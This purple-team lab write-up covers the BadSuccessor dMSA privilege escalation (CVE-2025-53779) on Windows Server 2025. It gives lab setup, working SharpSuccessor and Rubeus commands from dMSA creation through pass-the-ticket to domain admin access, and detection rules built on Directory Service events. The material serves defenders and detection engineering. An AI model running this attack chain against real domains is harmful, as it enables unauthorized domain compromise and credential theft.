# BadSuccessor: dMSA Privilege Escalation on Windows Server 2025

**CVE:** CVE-2025-53779  
**Original Research:** Yuval Gordon, Akamai Security Research  
**Lab Date:** April 2026  
**Domain:** badsuccessor.local  
**DC OS:** Windows Server 2025 Preview — Build 26100.0001 (UBR=1, native ntdsai.dll)  
**Attacker OS:** WIN-ATTACK — Windows Server 2022  
**SIEM:** Elastic Stack 8.19.14  

---

## Overview

BadSuccessor abuses the delegated Managed Service Account (dMSA) feature introduced in Windows Server 2025. Any user with CreateChild rights on an OU can create a dMSA, link it to any AD principal via `msDS-ManagedAccountPrecededByLink`, and obtain a Kerberos TGS carrying the target's keys and Privilege Attribute Certificate — without modifying the target object, changing group membership, or requiring any elevated privilege beyond OU CreateChild.

This writeup documents the attack chain, the lab environment required to reproduce it, and the detection telemetry generated at each stage.

---

## Lab Environment

### Infrastructure

| Machine | OS | IP | Role |
|---|---|---|---|
| WIN-TKLFN9EMLTJ | Windows Server 2025 Preview 26100.0001 | 192.168.1.4 | Domain Controller (badsuccessor.local) |
| WIN-ATTACK | Windows Server 2022 | 192.168.1.83 | Attacker workstation |
| ELK | Ubuntu 22.04 | 192.168.1.250 | Elasticsearch 8.19.14 + Kibana |

### Domain Configuration

- Forest/Domain: `badsuccessor.local` — Windows 2016 functional level (preview ISO default)
- KDS Root Key: backdated -10 hours for immediate dMSA support
- `lowpriv` — standard domain user, CreateChild on `OU=temp`
- Winlogbeat 8.19.14 shipping Security + Directory Service channels to ELK

---

## Lab Pain Points

This section documents what the published research does not cover. These issues will cost you days if you encounter them without context.

### 1. ISO Selection is Critical

**Use:** `en-us_windows_server_2025_preview_x64_dvd_ce9eb1a5.iso` (26100.0001 RTM, Datacenter Desktop Experience — index 4)

**Do not use:** 26100.1742 (Archive.org) — `ntdsai.dll` is absent from the AD DS payload. The DC promotes but the KDC runs without the dMSA key package handler. `PA_DMSA_KEY_PACKAGE` is absent from TGS-REP. Rubeus `/dmsa` crashes with a NullReferenceException. This looks like a Rubeus bug. It is not.

**Do not use:** Any build above UBR 4946 — the dMSA escalation path is patched at the KDC level.

**Verify before promotion:**
```powershell
# Must be below 4946
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").UBR

# Must return True
Test-Path "C:\Windows\System32\ntdsai.dll"
```

If either check fails — discard the ISO. Do not copy `ntdsai.dll` from another DC. A patched `ntdsai.dll` silently corrupts the KDC stack even if UBR appears clean.

### 2. Windows Update Must Be Blocked Before First Boot

Set the registry key before any other action after install:

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Force
```

Verify UBR after promotion reboot — it must still be 1. If it changed, an update applied during promotion. Rebuild.

### 3. PowerShell Promotion Fails on This ISO

`Install-ADDSForest` rejects its own parameters on build 26100.0001. The dcpromo engine predates the final parameter schema. Every parameter — `DomainNetbiosName`, `InstallDNS`, `ForestMode`, `NewDomain` — returns `DCPromo.General.77: The specified argument was not recognized` regardless of syntax.

Running the cmdlet multiple times in the same session compounds the problem — the runspace state corrupts and all subsequent calls fail even with valid parameters.

**Fix:** Use Server Manager GUI → Add Roles → AD DS → Promote this server to a domain controller. The wizard calls the same dcpromo engine but handles parameter translation correctly.

**Note:** The GUI promotion defaults to Windows 2016 functional level. This is sufficient for the attack — BadSuccessor requires only that a Server 2025 DC exists with a KDS Root Key, not Win2025 functional level.

### 4. ntdsai.dll Contamination

Copying `ntdsai.dll` from a patched DC (any build above UBR 4946) onto your clean DC — even as a "workaround" — corrupts the KDC. The file loads, the DC promotes, authentication works normally, but the KDC silently omits `PA_DMSA_KEY_PACKAGE` from dMSA TGS responses. The Rubeus `/dmsa` flag sends the correct request; the KDC simply does not include the key package in the reply.

This failure mode is invisible during promotion and basic AD testing. It only surfaces when you attempt the TGS request step.

### 5. Creator Owner ACE on dMSA Has No WriteProperty

The default Creator Owner ACE on the dMSA class is `A;;LCRPDTLOCRSDRC;;;CO` — read, list, delete, and DACL control, but no WriteProperty. SharpSuccessor handles this by self-granting GenericAll after object creation before writing the link attributes. If you attempt to write `msDS-ManagedAccountPrecededByLink` directly after creation without this self-grant, every attribute write fails with `insufficientAccessRights`. The error does not indicate the missing self-grant — it just looks like an access denial.

### 6. msDS-DelegatedMSAState is Mandatory

Object creation fails if `msDS-DelegatedMSAState` is not set. SharpSuccessor handles this. If you are attempting manual attribute writes, set this before attempting `msDS-ManagedAccountPrecededByLink`.

---

## Pre-Promotion Checklist

```powershell
# Step 1 — Block Windows Update (run immediately after first boot)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Force

# Step 2 — Verify UBR
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").UBR
# Expected: 1

# Step 3 — Verify ntdsai.dll absent (pre-promotion)
Test-Path "C:\Windows\System32\ntdsai.dll"
# Expected: False (absent pre-promotion is correct)

# Step 4 — Set static IP
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.1.4 -PrefixLength 24 -DefaultGateway 192.168.1.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 127.0.0.1

# Step 5 — Promote via Server Manager (not PowerShell — see Lab Pain Points #3)
# Add Roles → AD DS → Promote this server to a domain controller
# Add a new forest → badsuccessor.local
# DSRM password → P@ssw0rd123!

# Step 6 — Verify UBR post-promotion
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").UBR
# Expected: still 1
```

---

## Post-Promotion AD Setup

```powershell
Import-Module ActiveDirectory

# KDS Root Key — backdated for immediate use
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

# Attacker account
New-ADUser -Name "lowpriv" -SamAccountName "lowpriv" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true

# Target OU
New-ADOrganizationalUnit -Name "temp" -Path "DC=badsuccessor,DC=local"

# Grant lowpriv CreateChild on OU=temp
$ou = "OU=temp,DC=badsuccessor,DC=local"
$sid = (Get-ADUser lowpriv).SID
$acl = Get-Acl "AD:$ou"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid,
    [System.DirectoryServices.ActiveDirectoryRights]::CreateChild,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($ace)
Set-Acl "AD:$ou" $acl
```

---

## Auditing Setup

```powershell
# DS Access auditing
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
```

Object-level SACLs on `OU=temp` must be set via ADSI Edit (MMC) — `Set-Acl "AD:..."` requires `SeSecurityPrivilege` which is present but disabled in the default PowerShell session and cannot be reliably enabled programmatically on this build.

ADSI Edit → `OU=temp` → Properties → Security → Advanced → Auditing → Add:
- Principal: Everyone
- Type: Success
- Applies to: This object and all descendant objects
- Permissions: Create all child objects + Write all properties

---

## Attack Chain

### Tooling

| Tool | Source | Notes |
|---|---|---|
| SharpSuccessor | github.com/logangoins/SharpSuccessor | Built from source, Visual Studio 2026 |
| Rubeus | GhostPack/Rubeus master | v2.3.3 — `/dmsa` flag present |

### Step 1 — dMSA Creation (WIN-ATTACK as lowpriv)

```
C:\Tools\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=temp,DC=badsuccessor,DC=local" /account:lowpriv /name:svc-attack
```

**Expected output:**
```
[+] Wrote attribute successfully          ← msDS-ManagedAccountPrecededByLink written
[+] Created dMSA object 'CN=svc-attack' in 'OU=temp,DC=badsuccessor,DC=local'
[+] Successfully weaponized dMSA object
[+] msDS-SupersededServiceAccountState set to 2
[!] Exception: Access is denied.         ← Non-blocking — userAccountControl write fails, attack succeeds
```

### Step 2 — TGT via tgtdeleg (WIN-ATTACK as lowpriv)

```
C:\Tools\Rubeus.exe tgtdeleg /nowrap
```

Output: base64 TGT for `lowpriv` via fake CIFS delegation to the DC.

### Step 3 — dMSA TGS Request

```
C:\Tools\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/BADSUCCESSOR.LOCAL /targetuser:svc-attack$ /ticket:<TGT_BASE64> /nowrap /dc:192.168.1.4
```

**Critical output fields:**
```
UserName: svc-attack$ (NT_PRINCIPAL)
KeyType:  aes256_cts_hmac_sha1
Current Keys for svc-attack$: (aes256_cts_hmac_sha1) <32-byte key>
```

The presence of `Current Keys` confirms `PA_DMSA_KEY_PACKAGE` was returned. If this field is absent and Rubeus crashes, the KDC is patched or ntdsai.dll is contaminated.

### Step 4 — Pass the Ticket

```powershell
[System.IO.File]::WriteAllBytes("C:\Tools\svc-attack.kirbi", [System.Convert]::FromBase64String("<TGS_BASE64>"))
C:\Tools\Rubeus.exe ptt /ticket:C:\Tools\svc-attack.kirbi
```

### Step 5 — DA Access Verification

```powershell
dir \\WIN-TKLFN9EMLTJ.badsuccessor.local\C$
```

`lowpriv` reading `C$` on the DC as `svc-attack$` confirms domain compromise.

---

## Detection

### EID 3047 — Primary Detection Signal

**Channel:** Directory Service  
**Provider:** Microsoft-Windows-ActiveDirectory_DomainService  
**Trigger:** dMSA creation where the caller lacks write permission on one or more dMSA attributes

This event fires without any SACL configuration. It is generated by the DC's audit-only mode for the dMSA security check.

**Key fields:**

| Field | Value | Significance |
|---|---|---|
| `winlog.event_data.param1` | `CN=svc-attack,OU=temp,...` | dMSA object DN |
| `winlog.event_data.param2` | `msDS-DelegatedManagedServiceAccount` | Object class — unique to this attack |
| `winlog.event_data.param3` | `BADSUCCESSOR\lowpriv` | Actor |
| `winlog.event_data.param4` | `192.168.1.83:51025` | Source IP:port |
| `winlog.event_data.param6` | `msDS-ManagedAccountPrecededByLink` | Denied attribute — confirms weaponization attempt |

**Kibana Detection Rule:**

```
winlog.channel: "Directory Service" and winlog.event_id: 3047 and winlog.event_data.param2: "msDS-DelegatedManagedServiceAccount"
```

Note: `param6` contains newline-separated attribute names. KQL wildcard matching does not cross newlines — filter on `param2` instead, which is a single clean string.

**Rule configuration:**
- Severity: Critical
- Risk score: 99
- Interval: 5m
- Lookback: now-6m
- MITRE: TA0004 (Privilege Escalation) / T1134, TA0006 (Credential Access) / T1558

### EID 2946 — TGS Confirmation Signal

**Channel:** Directory Service  
**Trigger:** KDC issues dMSA key package (password fetch for the dMSA account)

```
winlog.event_id: 2946
```

Key field: `winlog.event_data.param1` contains the dMSA DN. `winlog.user.name` is `ANONYMOUS LOGON` — the KDC fetches the key on behalf of the requesting principal without attributing it to that principal. This is expected behavior, not an anomaly.

### EID 3079 — Unencrypted LDAP Warning

SharpSuccessor uses plain LDAP (not LDAPS). The DC logs EID 3079 when a client queries confidential attributes over an unencrypted connection. This fires alongside 3047 and provides additional corroboration of the attack.

### What 5136 Requires (and Why It Didn't Fire Here)

EID 5136 (Directory Service object modification) requires an object-level SACL with `WriteProperty` audit enabled, combined with `SeSecurityPrivilege` being active in the session applying the SACL. On the preview build, `SeSecurityPrivilege` is present but disabled in the default PowerShell session and setting it programmatically was unreliable. ADSI Edit succeeded in applying the SACL for `CreateChild` (EID 5137) but the `WriteProperty` SACL for `msDS-ManagedAccountPrecededByLink` did not reliably inherit to child objects.

In a properly configured production environment with correct SACL inheritance, 5136 should fire on the attribute write. In this lab, EID 3047 proved to be a more reliable and SACL-independent detection signal.

---

## Patch Status

CVE-2025-53779 was patched in the August 2025 Patch Tuesday update. The patch requires mutual pairing — a two-sided link — before the KDC will accept the dMSA migration relationship. A one-sided `msDS-ManagedAccountPrecededByLink` write no longer results in privilege inheritance or key issuance.

This lab deliberately uses a pre-patch ISO (26100.0001, UBR=1) to reproduce the original vulnerability. The detection signals documented here remain valid for identifying exploitation attempts in environments that have not applied the patch, and for post-compromise forensic analysis.

---

## References

- Yuval Gordon, Akamai — [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- SharpSuccessor — [github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- Microsoft CVE-2025-53779 — August 2025 Patch Tuesday
- [BadSuccessor Is Dead, Long Live BadSuccessor](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch) — post-patch analysis

---

<img width="1879" height="1036" alt="kibanaalert" src="https://github.com/user-attachments/assets/9b0c08e9-5e25-449b-9014-5b85b8718dc8" />


<img width="1354" height="507" alt="SHARPSUCCESSOR" src="https://github.com/user-attachments/assets/74f553f7-1b31-41ea-91b5-e89c55eba938" />

<img width="1851" height="738" alt="RUBEUS1" src="https://github.com/user-attachments/assets/087e7bfc-b9bf-4f3e-9cb2-e8595500d72a" />

<img width="1852" height="833" alt="RUBEUS2" src="https://github.com/user-attachments/assets/86d97205-6570-42a0-af98-f3fc638d6b82" />

<img width="1847" height="890" alt="rubeusDA" src="https://github.com/user-attachments/assets/7219fbee-c3dd-4de5-8834-65fa4372b188" />





*Part of the AD-Lab-Research Vector series — purple team validation of high-impact AD attack chains with live detection telemetry.*  
*github.com/osherjacobs/AD-Lab-Research*
